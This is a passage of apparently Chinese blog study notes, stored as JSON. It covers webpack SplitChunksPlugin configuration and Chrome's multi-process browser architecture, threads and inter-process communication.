\u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;lodash\u0026#34;], }; let cacheGroups = { vendor: { test: /lodash/, }, default: { minChunks: 2, }, }; let vendorChunk = { name: `vendor~node_modules_lodash_js`, modules: [\u0026#34;lodash\u0026#34;], }; let defaultChunk = { name: `default~page1~page2`, modules: [\u0026#34;C\u0026#34;], }; 工作流程\nSplitChunksPlugi 先尝试把minChunks规则的模块抽取到单独的Chunk中 判断该 Chunk 是否满足maxInitialRequests配置项的要求 判断体积是否满足minSize的大小，如果小于minSize则不分包，如果大于minSize判断是否超过maxSize,如果大于maxSize则继续拆分成更小的包 maxInitialRequest：用于设置 Initial Chunk 最大并行请求数。\nmaxAsyncRequests：用于设置 Async Chunk 最大并行请求数。\n请求数是指加载一个Chunk时所需要加载的所有的分包数量,包括Initial Chunk，但不包括Async Chunk和runtimeChunk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); const AssetPlugin = require(\u0026#34;./asset-plugin\u0026#34;); module.exports = { mode: \u0026#34;development\u0026#34;, devtool: false, entry: { page1: \u0026#34;./src/page1.js\u0026#34;, page2: \u0026#34;./src/page2.js\u0026#34;, page3: \u0026#34;./src/page3.js\u0026#34;, }, optimization: { splitChunks: { // 表示选择哪些 chunks 进行分割，可选值有：async，initial和all chunks: \u0026#34;all\u0026#34;, // 表示新分离出的chunk必须大于等于minSize，默认为30000，约30kb。 minSize: 0, //默认值是20000,生成的代码块的最小尺寸 // 表示一个模块至少应被minChunks个chunk所包含才能分割。默认为1。 minChunks: 1, // 表示按需加载文件时，并行请求的最大数目。默认为5。 maxAsyncRequests: 3, // 表示加载入口文件时，并行请求的最大数目。默认为3 maxInitialRequests: 5, // 表示拆分出的chunk的名称连接符。默认为~。如chunk~vendors.js automaticNameDelimiter: \u0026#34;~\u0026#34;, cacheGroups: { defaultVendors: { test: /[\\\\/]node_modules[\\\\/]/, //条件 priority: -10, ///优先级，一个chunk很可能满足多个缓存组，会被抽取到优先级高的缓存组中,为了能够让自定义缓存组有更高的优先级(默认0),默认缓存组的priority属性为负值. }, default: { minChunks: 2, ////被多少模块共享,在分割之前模块的被引用次数 priority: -20, }, }, }, runtimeChunk: true, }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, chunks: [\u0026#34;page1\u0026#34;], filename: \u0026#34;page1.html\u0026#34;, }), new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, chunks: [\u0026#34;page2\u0026#34;], filename: \u0026#34;page2.html\u0026#34;, }), new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, chunks: [\u0026#34;page3\u0026#34;], filename: \u0026#34;page3.html\u0026#34;, }), new AssetPlugin(), ], }; webpack-assets-plugin.js\nplugins\\webpack-assets-plugin.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class WebpackAssetsPlugin { constructor(options) { this.options = options; } apply(compiler) { //每当webpack开启一次新的编译 ，就会创建一个新的compilation compiler.hooks.compilation.tap(\u0026#34;WebpackAssetsPlugin\u0026#34;, (compilation) =\u0026gt; { //每次根据chunk创建一个新的文件后会触发一次chunkAsset compilation.hooks.chunkAsset.tap( \u0026#34;WebpackAssetsPlugin\u0026#34;, (chunk, filename) =\u0026gt; { console.log(chunk.id, filename); } ); }); } } module.exports = WebpackAssetsPlugin; page1.js\n1 2 3 4 5 let module1 = require(\u0026#34;./module1\u0026#34;); let module2 = require(\u0026#34;./module2\u0026#34;); let $ = require(\u0026#34;jquery\u0026#34;); console.log(module1, module2, $); import(/* webpackChunkName: \u0026#34;asyncModule1\u0026#34; */ \u0026#34;./asyncModule1\u0026#34;); page2.js\n1 2 3 4 let module1 = require(\u0026#34;./module1\u0026#34;); let module2 = require(\u0026#34;./module2\u0026#34;); let $ = require(\u0026#34;jquery\u0026#34;); console.log(module1, module2, $); page3.js\n1 2 3 4 let module1 = require(\u0026#34;./module1\u0026#34;); let module3 = require(\u0026#34;./module3\u0026#34;); let $ = require(\u0026#34;jquery\u0026#34;); console.log(module1, module3, $); module1.js\n1 module.exports = \u0026#34;module1\u0026#34;; module2.js\n1 console.log(\u0026#34;module2\u0026#34;); module3.js\n1 console.log(\u0026#34;module3\u0026#34;); asyncModule1.js\n1 2 import _ from \u0026#34;lodash\u0026#34;; console.log(_); 打包后的结果\n1 2 3 4 5 6 7 8 9 10 11 12 //入口代码块 page1.js page2.js page3.js //异步加载代码块 src_asyncModule1_js.js //defaultVendors缓存组对应的代码块 defaultVendors-node_modules_jquery_dist_jquery_js.js defaultVendors-node_modules_lodash_lodash_js.js //default代缓存组对应的代码块 default-src_module1_js.js default-src_module2_js.js 计算过程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 let page1Chunk = { name: \u0026#34;page1\u0026#34;, modules: [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;lodash\u0026#34;], }; let page2Chunk = { name: \u0026#34;page2\u0026#34;, module: [\u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;lodash\u0026#34;], }; let cacheGroups = { vendor: { test: /lodash/, }, default: { minChunks: 2, }, }; let vendorChunk = { name: `vendor~node_modules_lodash_js`, modules: [\u0026#34;lodash\u0026#34;], }; let defaultChunk = { name: `default~page1~page2`, modules: [\u0026#34;C\u0026#34;], }; reuseExistingChunk\nreuseExistingChunk表示如果当前的代码包含已经被从主 bundle 中分割出去的模块，它将会被重用，而不会生成一个新的代码块 index.js\nwebpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); const AssetPlugin = require(\u0026#39;./asset-plugin\u0026#39;); module.exports = { mode: \u0026#39;development\u0026#39;, devtool: false, + entry: \u0026#39;./src/index.js\u0026#39;, optimization: { splitChunks: { // 表示选择哪些 chunks 进行分割，可选值有：async，initial和all chunks: \u0026#39;all\u0026#39;, // 表示新分离出的chunk必须大于等于minSize，默认为30000，约30kb。 minSize: 0,//默认值是20000,生成的代码块的最小尺寸 // 表示一个模块至少应被minChunks个chunk所包含才能分割。默认为1。 minChunks: 1, // 表示按需加载文件时，并行请求的最大数目。默认为5。 maxAsyncRequests: 3, // 表示加载入口文件时，并行请求的最大数目。默认为3 maxInitialRequests: 5, // 表示拆分出的chunk的名称连接符。默认为~。如chunk~vendors.js automaticNameDelimiter: \u0026#39;~\u0026#39;, + cacheGroups: { + defaultVendors: false, + default: false, + common: { + minChunks: 1, + reuseExistingChunk: false + } + } }, + runtimeChunk: false }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#39;./src/index.html\u0026#39;, filename: \u0026#39;index.html\u0026#39; }) new AssetPlugin() ] } 结果\n1 2 3 4 5 6 //reuseExistingChunk: false main main.js common-src_index_js common-src_index_js.js //reuseExistingChunk: true main main.js ","date":"2025-03-12T15:02:09+08:00","image":"http://localhost:1313/blogs/post/webpack/877_hu_6f771d520343a4af.jpg","permalink":"http://localhost:1313/blogs/post/webpack/","title":"Webpack"},{"content":"浏览器工作原理 浏览器（以 chrome 为例）的进程架构，渲染流程 页面劫持，安全，性能优化 08 年 Chrome 浏览器推出，颠覆了之前浏览器的架构设计，在速度和安全性上占绝对优势。在 10 年底，Google 还推出了一款网络操作系统——ChromeOS。\n浏览器的三个大发展方向（ 目前 Web 应用能做什么，未来能适用于哪些新领域）\n应用程序 Web 化。（云计算和 HTML5 发展）越来越多的应用转向了浏览器 / 服务器（B/S）架构，视频、音频、游戏也都有 Web 场景。\nWeb 应用移动化。移动设备上的浏览器就支持 web 技术，但移动端 web 存在的问题：渲染流程过于复杂且性能不及原生应用、离线时用户无法使用、无法接收消息推送、移动端没有一级入口，但 Google 推出了 PWA 方案来整合 Web 和本地程序各自的优势。\nWeb 操作系统化。Web 操作系统有两层含义：\n一是利用 Web 技术构建一个操作系统，如 ChromeOS； 二是浏览器的底层结构往操作系统架构方向发展； Chrome 朝 SOA （面向服务的架构）的方向演化，未来很多模块都会以服务的形式提供给上层应用使用； 在浏览器中引入多种编程语言的支持，比如新支持的 WebAssembly； 简化渲染流程，使渲染过程更加直接高效； 加大对系统设备特性的支持； 提供对复杂 Web 项目开发的支持。 浏览器逐步演化成了操作系统之上的“操作系统”。\n为什么学习浏览器工作原理？ 准确评估 Web 开发项目的可行性\n优化 web 页面的性能\n站在用户体验角度来考虑页面性能。几个常见的用户体验指标：页面加载时长、用户交互反馈时长、Web 动画中的帧数，这些指标是由一系列的复杂因素导致的。为了开发流畅的页面，诊断 Web 页面中的性能问题。可以站在更高的维度审视你的项目，通过全视野快速定位项目中不合理的地方。首屏的显示就涉及了 DNS、HTTP、DOM 解析、CSS 阻塞、JavaScript 阻塞等技术因素\n把握技术发展的方向和本质\n理解现有的 web 技术存在的不足，理解未来的 web 技术的针对这些不足而创造的新技术方案。\nNode.js 能快速地发展，根本原因还是浏览器功能以及整个前端的开发环境，不足以支撑日益增长的需求。\n虽然前端技术变化快，这里有更大的机遇，谁能快速抓住变化，谁就能收获这波变化带来的红利。\n随着脚本执行效率的提高、页面渲染性能的提升和开发工具链的完善，前端会进入一个相对平稳的阶段。通俗地理解就是：等到核心技术足以支撑核心需求，那么前端生态会进入一个相对稳定的状态。\n前端技术演进:\n首先是脚本执行速度问题。比如针对 JavaScript 设计缺陷和执行效率的问题，可以从以下两个途径去解决：\n不断修订和更新语言本身，所以出现了 ES6、ES7、ES8， TypeScript 。\n使用新的语言 WebAssembly 。WebAssembly 需要经过编译器编译，所以体积小、执行速度快，使用它能大幅提升语言的执行效率，但是语言本身的完善，和生态的构建都是需要花很长时间完善。\n前端模块化开发。Web 工程复杂程度提高，产生了模块化开发的需求，于是相应出现了 WebComponents 标准。React 和 Vue 都在渐进地适应 WebComponents 标准，同时各种前端框架的最佳实践也会反过来影响 WebComponents 标准的制定。\n理解浏览器工作原理会对 WebComponents 中涉及的 Shadow DOM、HTML Templates 等技术有更的理解。\n渲染效率问题。理解浏览器的渲染流程，知道目前页面的渲染依然存在的缺陷，避开这些缺陷，开发出更加高效的 Web 应用。同时，Chrome 团队也在着手改善这些缺陷，比如正在开发的下一代布局方案 LayoutNG，还有渲染瘦身方案 Slim Paint，其目的都是让渲染变得更加简单和高效。\n《webkit 技术内幕》—— 朱永盛\n宏观视角：\nChrome 进程架构 TCP 协议 HTTP 请求流程 导航流程 渲染流程 浏览器中 JavaScript 执行机制：\nJS 执行顺序（编译和执行） 调用栈 作用域 词法环境和变量环境 this V8 工作原理：\n堆栈内存 垃圾回收 编译器和解释器 事件循环系统：\n消息队列和事件循环及其代表性 API：setTimeout 和 XMLHttpRequest 宏任务和微任务：Promise 和 async/await WEB 页面的性能优化：\n利用 Chrome 做应用性能分析 其他性能优化 js 脚本对 DOM 树的影响 HTTP 不同版本：\nHTTP/1 HTTP/2 HTTP/3 浏览器安全：\n同源策略 跨站脚本攻击 跨站点伪造请求 沙盒 https 网络，渲染进程，JavaScript 执行机制，浏览器安全。\n前端工程师需要具备哪些核心的基础技能呢？\n利用 UI 层来展示一些数据和承载交互 前端工程化（node.js） 渲染工具：浏览器 数据结构与算法 图形学（webgl，canvas，glsl） 计算机学科基础 Chrome 的排版引擎是 Blink，Blink 是从 Webkit 分支独立出来的，起初和 Webkit 基本是一样的，但是随着 Google 在 Blink 上的发力，目前的差异已经非常大了。其实站在大的结构层面来看，Blink，WebKit ， Gecko 三者的渲染流水线基本是类似的，只是一些术语有些不同。但是落实到具体实现层面来看，差别就很大了，如 JS 引擎的实现，排版过程，绘制过程等都有很大差异。\n浏览器获取服务端响应的 set-cookie 后，浏览器请求里的 cookie 是调用了浏览器本身内置的方法写进去的吗？\n是的，你以把 http 响应头看成是服务器和浏览器对话的语言， 响应头中的 set-cookie 字段就是告诉浏览器：“浏览器，帮我把这段 Cookie 写到本地去”！ 所以浏览器在接收 set-cookie 后，就会将 cookie 写到本地！\nChrome 架构：多进程 优化和设计高性能 Web 应用，都可以从网络、页面渲染，JavaScript 执行，以及 Web 安全这些方面出发。这些功能是分散在浏览器的各个功能组件( 浏览器的多进程架构 )中的。\nChrome 打开一个页面需要启动多少进程？\n点击 Chrome 浏览器右上角的“选项”菜单，选择“更多工具”子菜单，点击“任务管理器”，这将打开 Chrome 的任务管理器的窗口，如下图：\nChrome 任务管理器用来展示**运行中 Chrome 使用的进程信息的。**从图中可以看到，Chrome 启动了至少 4 个进程。\n现在的情况：\n为什么要启动这么多进程？\n并行处理 并行处理：同一时刻处理多个任务（并行处理依赖于多线程来处理）。\n比如计算下面这三个表达式的值，并显示出结果：\n1 2 3 A = 1 + 2; B = 20 / 5; C = 7 * 8; 可以把这个过程拆分为四个任务：\n任务 1 是计算 A=1+2； 任务 2 是计算 B=20/5； 任务 3 是计算 C=7*8； 任务 4 是显示最后计算的结果。 使用单线程来处理，也就是分四步按照顺序分别执行这四个任务。\n采用多线程，只需分“两步走”：第一步，使用三个线程同时执行前三个任务；第二步，再执行第四个显示任务。\n使用并行处理（多线程）能大大提升性能。\n进程和线程 并行处理任务是基于多线程的，但是线程是不能单独存在的，它是由进程来启动和管理的。\n一个进程就是一个程序的运行实例。详细解释就是，启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，把这样的一个运行环境叫进程。该主进程的线程在运行过程中，可以创建其他进程。\n线程是依附于进程的，而进程中使用多线程并行处理能提升运算效率。\n进程和线程的关系 同一个进程中的任意一线程执行出错，都会导致整个进程的崩溃，该进程中的其他线程执行生成的数据也会丢失。\n同一个进程中的线程之间共享进程中的公共数据。 **当一个进程关闭之后，操作系统会回收进程所占用的内存。**当一个进程退出时，操作系统会回收该进程所申请的所有资源；即使其中任意线程因为操作不当导致内存泄漏，当进程退出时，这些内存也会被正确回收。\n进程之间的内容相互隔离。进程隔离是为保护操作系统中进程互不干扰的技术，每一个进程只能访问自己占有的数据，也就避免出现进程 A 写入数据到进程 B 的情况。正是因为进程之间的数据是严格隔离的，所以一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的。如果进程之间需要进行数据的通信，需要使用用于进程间通信（IPC）的机制。\n浏览器的架构 单进程浏览器 单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程里，这些模块包含了网络、插件、JavaScript 运行环境、渲染引擎和页面等。2007 年之前，市面上浏览器都是单进程的。单进程浏览器的架构如下图所示：\n这么多的功能模块运行在一个进程里，导致单进程浏览器不稳定、不流畅和不安全。\n问题 1：不稳定\n早期浏览器借助插件来实现诸如视频、游戏等各种功能，但是插件是最容易出问题的模块，并且还运行在浏览器进程之中，所以一个插件的意外崩溃会引起整个浏览器的崩溃。\n渲染引擎模块也是不稳定的，一些复杂的 JavaScript 代码就有可能引起渲染引擎模块的崩溃。渲染引擎的崩溃也会导致整个浏览器的崩溃。\n问题 2：不流畅\n所有页面的渲染模块、JavaScript 执行环境以及插件都是运行在同一个线程中的，这就意味着同一时刻只能有一个模块可以执行。\n如果某个任务独占整个线程，这样导致其他运行在该线程中的模块就没有机会被执行。因为浏览器中所有都运行在该一个线程中，所以这些页面都没有机会去执行任务，这样就会导致整个浏览器失去响应，变卡顿。\n除了脚本或者插件会让单进程浏览器变卡顿外，页面的内存泄漏也是单进程变慢的一个重要原因。通常浏览器的内核都是非常复杂的，运行一个复杂点的页面再关闭页面，会存在内存不能完全回收的情况，这样导致的问题是使用时间越长，内存占用越高，浏览器会变得越慢。\n问题 3：不安全\n插件可以使用 C/C++ 等代码编写，通过插件可以获取到操作系统的任意资源，当你在页面运行一个插件时也就意味着这个插件能完全操作你的电脑。如果是个恶意插件，那么它就可以释放病毒、窃取你的账号密码，引发安全性问题。\n至于页面脚本，它可以通过浏览器的漏洞来获取系统权限，这些脚本获取系统权限之后也可以对你的电脑做一些恶意的事情，同样也会引发安全问题。\n多进程浏览器 08 年 Chrome 发布时的进程架构\nChrome 的每一个 tab 页面（非同一站点且 chrome 的默认进程策略）是运行在各自单独的渲染进程中的，同时插件也是运行在各自单独的插件进程之中，而进程之间是通过 IPC 机制进行通信。\n由于进程是相互隔离的，所以当一个页面或者插件崩溃时，影响到的仅仅是当前的页面进程或者插件进程，并不会影响到浏览器和其他页面，这解决了页面或者插件的崩溃会导致整个浏览器崩溃，也就是不稳定的问题。\nJavaScript 引擎是运行在渲染进程中的，所以即使 JavaScript 阻塞了渲染进程，影响到的也只是当前的渲染页面，而并不会影响浏览器和其他页面，**因为其他页面的脚本是运行在它们自己的渲染进程中的。**所以当我们在 Chrome 中运行死循环的脚本时，没有响应的仅仅是当前的页面。\n当关闭一个页面时，整个渲染进程也会被关闭，之后该进程所占用的内存都会被系统回收，这样就解决了浏览器页面的内存泄漏问题。\n采用多进程架构可以使用安全沙箱，沙箱里面的程序可以运行，但是不能在硬盘上写入任何数据，也不能在敏感位置读取任何数据，例如你的文档和桌面。Chrome 把插件进程和渲染进程锁在沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限。\n较新的 Chrome 进程架构 较新的 Chrome 浏览器包括：1 个浏览器（Browser）主进程、1 个 GPU 进程、1 个网络（NetWork）进程、多个渲染进程和多个插件进程\n浏览器进程。主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。 渲染进程。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，**默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。**出于安全考虑，渲染进程都是运行在沙箱模式下。渲染进程中有一个主线程，该主线程可以执行排版引擎和 JavaScript 引擎的任务，且任务是互斥的。 GPU 进程。Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。后来，Chrome 在其多进程架构上也引入了 GPU 进程。 网络进程。主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。 插件进程。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。 渲染进程下的线程\nGUI 渲染线程：解析 HTML，CSS，构建 DOM 树和 RenderObject 树，布局和绘制等，当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行。 JS 引擎线程：JS 引擎线程负责解析 Javascript 脚本，运行代码。js 代码在执行的过程中可能会创建其他线程 事件触发线程：归属于浏览器而不是 JS 引擎，用来控制事件循环。当 JS 引擎执行代码块如 setTimeOut 时（也可以是来自浏览器内核的其他线程,如鼠标点击、AJAX 异步请求等），会将对应任务添加到事件线程中，当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待 JS 引擎的处理。 定时触发器线程：setInterval 与 setTimeout 所在线程，浏览器定时计数器并不是由 JavaScript 引擎计数的,（因为 JavaScript 引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确），因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待 JS 引擎空闲后执行） 合成线程 IO 线程 多进程带来的问题\n更高的资源占用。因为每个进程都会包含公共基础结构的副本（如 JavaScript 运行环境），这就意味着浏览器会消耗更多的内存资源。\n更复杂的体系架构。浏览器各模块之间耦合性高、扩展性差等问题，会导致现在的架构难适应新的需求。\n为了解决这些问题，2016 年，Chrome 官方团队使用“面向服务的架构”（Services Oriented Architecture，简称 SOA）的思想设计了新的 Chrome 架构。 Chrome 整体架构会朝向现代操作系统所采用的“面向服务的架构” 方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行，访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，从而构建一个更内聚、松耦合、易于维护和扩展的系统，更好实现 Chrome 简单、稳定、高速、安全的目标。\nChrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，Chrome“面向服务的架构”的进程模型图：\n目前 Chrome 正处在老的架构向服务化架构过渡阶段。\n同时 Chrome 还提供灵活的弹性架构，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 会将很多服务整合到一个进程中，从而节省内存占用。\n最初的浏览器都是单进程的，它们不稳定、不流畅且不安全，之后出现了 Chrome，引入了多进程架构，并解决了这些遗留问题。随后 Chrome 试图应用到更多业务场景，如移动设备、VR、视频等，为了支持这些场景，Chrome 的架构体系变得越来越复杂，这种架构的复杂性倒逼 Chrome 开发团队必须进行架构的重构，最终 Chrome 团队选择了面向服务架构（SOA）形式。\n问题\n即使是如今的多进程架构，偶尔还会碰到一些由于单个页面卡死，崩溃导致所有页面崩溃的情况，请问这是什么原因呢？\n作者回复: 通常情况下是一个页面使用一个进程，但是，有一种情况，叫\u0026quot;同一站点(same-site)\u0026quot;，具体地讲，我们将“同一站点”定义为根域名（例如，geekbang.org）加上协议 （例如，https:// 或者 http://），还包含了该根域名下的所有子域名和不同的端口，比如下面这 三个：\nhttps://time.geekbang.org\nhttps://www.geekbang.org\nhttps://www.geekbang.org:8080\n都是属于同一站点，因为它们的协议都是 https，而根域名也都是 geekbang.org。你也许了解同源策略，但是同一站点和同源策略还是存在一些不同地方，在这里你需要了解它们不是同一件事。\nChrome 的默认策略是，每个标签对应一个渲染进程。但是如果从一个页面打开了新页面，而新页面和当前页面属于同一站点时，那么新页面会复用父页面的渲染进程。官方把这个默认策略叫process-per-site-instance。\n直白的讲，就是如果几个页面符合同一站点，那么他们将被分配到一个渲染进程里面去。\n所以，这种情况下，一个页面崩溃了，会导致同一站点的页面同时崩溃，因为他们使用了同一个渲染进程。\n为什么要让他们跑在一个进程里面呢？\n因为在一个渲染进程里面，他们就会共享 JS 的执行环境，也就是说 A 页面可以直接在 B 页面中执行脚本。因为是同一家的站点，所以是有这个需求的。\n浏览器的进程 进程模型 Process-per-site-instance：默认模式。访问不同站点创建新的进程，在旧页面中打开的新页面，且新页面与旧页面属于同一站点的话会共用一个进程 Process-per-site：同一站点使用同一进程 Process-per-tab：每一个标签页都创建新的进程 Single Process：单进程模式 线程模型 MessagePumpForIO：处理进程间通信的线程，在 Chrome 中，这类线程都叫做 IO 线程\nMessagePumpForUI：处理 UI 的线程用的\nMessagePumpDefault：一般的线程用到的\n进程间通信方式 管道通信：就是操作系统在内核中开辟一段缓冲区，进程 1 可以将需要交互的数据拷贝到这个缓冲区里，进程 2 就可以读取了 消息队列通信：消息队列就是用户可以添加和读取消息的列表，消息队列里提供了一种从一个进程向另一个进程发送数据块的方法，不过和管道通信一样每个数据块有最大长度限制 共享内存通信：就是映射一段能被其他进程访问的内存，由一个进程创建，但多个进程都可以访问，共享进程最快的是IPC方式 信号量通信：比如信号量初始值是 1，进程 1 来访问一块内存的时候，就把信号量设为 0，然后进程 2 也来访问的时候看到信号量为 0，就知道有其他进程在访问了，就不访问了 socket：其他的都是同一台主机之间的进程通信，而在不同主机的进程通信就要用到 socket 的通信方式了，比如发起 http 请求，服务器返回数据 多个标签之间的通信 没有办法直接通信，需要有一个类似中介者进行消息的转发和接收，比如\nlocalStorage：在一个标签页监听 localStorage 的变化，然后当另一个标签页修改的时候，可以通过监听获取新数据 WebSocket：因为 websocket 可以实现实时服务器推送，所以服务器就可以来当这个中介者。标签页通过向服务器发送数据，然后服务器再向其他标签推送转发 ShareWorker：会在页面的生命周期内创建一个唯一的线程，并开启多个页面也只会使用同一个线程，标签页共享一个线程 postMessage： 1 2 3 4 5 6 // 发送方 window.parent().pastMessage(\u0026#34;发送的数据\u0026#34;, \u0026#34;http://接收的址\u0026#34;); // 接收方 window.addEventListener(\u0026#34;message\u0026#34;, (e) =\u0026gt; { let data = e.data; }); 单进程浏览器开多个页面，渲染线程也只有一个吗？感觉一个页面开一个线程不是更合理吗？\n之前回答的有点笼统，下面是我整理过后的回答：\nIE6 时代，浏览器是单进程的，所有页面也都是运行在一个主线程中的，当时 IE6 就是这样设计，而且此时的IE6 是单标签，也就是说一个页面一个窗口。\n这时候，国内有很多国产浏览器，都是基于 IE6 来二次开发的，而 IE6 原生架构就是所有页面跑在单线程里面的，意味着，所有的页面都共享着同一套 JavaScript 运行环境，同样，对于存储 Cookie 也都是在一个线程里面操作的。而且这些国产浏览器由于需要，都采用多标签的形式，所以其中的一个标签页面的卡顿都会影响到整个浏览器。\n基于卡顿的原因，国内浏览器就开始尝试支持页面多线程，也就是让部分页面运行在单独的线程之中，运行在单独的线程之中，意味着每个线程拥有单独的 JavaScript 执行环境，和 Cookie 环境，这时候问题就来了：比如 A 站点页面登陆一个网站，保存了一些 Cookie 数据到磁盘上，再在当前线程环境中保存部分 Session 数据，由于 Session 是不需要保存到硬盘上的，所以 Session 只会保存在当前的线程环境中。这时候再打开另外一个 A 站点的页面，假设这个页面在另外一个线程中里面，那么它首先读取硬盘上的 Cookie 信息，但是，由于 Session 信息是保存在另外一个线程里面的，无法直接读取，这样就要实现一个 Session 同步的问题，由于 IE 并没有源代码，所以实现起来非常困难，国内浏览器花了好长一点时间才解决这个问题的。\nSession 问题解决了，但是假死的问题依然有，因为进程内使用了一个窗口，这个窗口是依附到浏览器主窗口之上的，所以他们公用一套消息循环机制，消息循环我们后面会详细地讲，这也就意味这一个窗口如果卡死了。也会导致整个浏览器的卡死。\n国产浏览器又出了一招，就是把页面做成一个单独的弹窗，如果这个页面卡死了，就把这个弹窗给隐藏掉。\n这里还要提一下为什么 Chrome 中的一个页面假死不会影响到主窗口呢？这是因为 chrome 输出的实际上图片，然后浏览器端把图片贴到自己的窗口上去，在 Chrome 的渲染进程内，并没有一个渲染窗口，输出的只是图片，如果卡住了，顶多图片不更新了。\n国产浏览器这一套技术花了四五年时间，等这套技术差不多成熟时，Chrome 发布了\n浏览器主进程负责将渲染进程生成的图片显示在 ui 上面，就是说渲染进程输出的最终是图片，浏览器显示的是图片，那么为什么浏览器中鼠标能选中文字？如果页面是图片的话文字是选不中的啊，这里面的机制又是怎样的？\n点击鼠标选中文字的时候，这些消息会传递到渲染进程，渲染进程再合成选中文字的状态，然后更新图片！\n并不是 jpg/png 这种格式的图片；我自己理解为渲染层或者图层感觉比较好，这里作者的定义有点不够准确。\nChrome 的 navigator 属性值里只看到了 AppleWebkit，不理解这是为什么？\n你说的是 UserAgent，又称为 UA，UA 是浏览器的身份证，通常，在发送 HTTP 请求时，UA 会附带在 HTTP 的请求头中 user-agent 字段中，这样服务器就会知道浏览器的基础信息，然后服务器会根据不同的 UA 返回不同的页面内容，比如手机上返回手机的样式，PC 就返回 PC 的样式。\n你也可以在浏览器的控制台中输入： navigator.userAgent 来查看当前浏览器的 UA 信息。\nFireFox 中的打印的信息是： \u0026ldquo;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\u0026rdquo;\nChrome 中打印的信息是： \u0026ldquo;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36\u0026rdquo;\n安卓系统中的 Chrome 浏览器： \u0026ldquo;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36\u0026rdquo;\n我们知道了服务器会根据不同的 UA 来针性的设计不同页面，所以当出了一款新浏览器时，他如果使用自己独一无二的 UA，那么之前的很多服务器还需要针对他来做页面适配，这显然是不可能的，比如 Chrome 发布时他会在他的 UA 中使用“Mozilla” ，“AppleWebKit”，等关键字段，用来表示他同时支持 Mozilla 和 AppleWebKit，然后再在最后加上他自己的标示，如 Chrome/xxx。\n这就解释了为什么你查看的信息中含有 WebKit 字样。\n为什么单进程浏览器当时不可以采用安全沙箱？\n如果一个进程使用了安全沙箱之后，该进程对于操作系统的权限就会受到限制，比如不能对一些位置的文件进行读写操作，而这些权限浏览器主进程所需要的，所以安全沙箱是不能应用到浏览器主进程之上的。\n如果打开了 2 个页面，会有几个进程呢？是 1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 2 个渲染进程，共 5 个吗？这些进程是可以在浏览器开发者中被实际观察到的吗？\n作者回复: 通常情况下会是五个，但是有很多其他情况：\n1:如果页面里有 iframe 的话，iframe 也会运行在单独的进程中！\n2:如果页面里有插件，同样插件也需要开启一个单独的进程！\n3:如果你装了扩展的话，扩展也会占用进程\n4:如果 2 个页面属于同一站点的话，并且从 a 页面中打开的 b 页面，那么他们会公用一个渲染进程\n这些进程都可以通过 chrome 的任务管理器来查看。\n为什么我这多了一个 v8 代理解析工具?\n作者回复: Chrome 支持使用 JavaScript 来写连接代理服务器脚本，又称为在线 pac 代理脚本，pac 脚本具体什么样子你可以搜索“PAC 代理脚本”，总之使用 pac 代理脚本可以实现一些那啥的事。\n刚开始的时候啊，Chrome 是在浏览器进程里面解析 pac 代理脚本的，由于是 JavaScript 脚本，所有需要在浏览器进程里面引入 V8，不过把 V8 运行在浏览器进程似乎不太好，于是 Chrome 团队后来就把这个功能独立出来一个进程了，这个进程就叫着“Utility: V8 Proxy Resolver”。 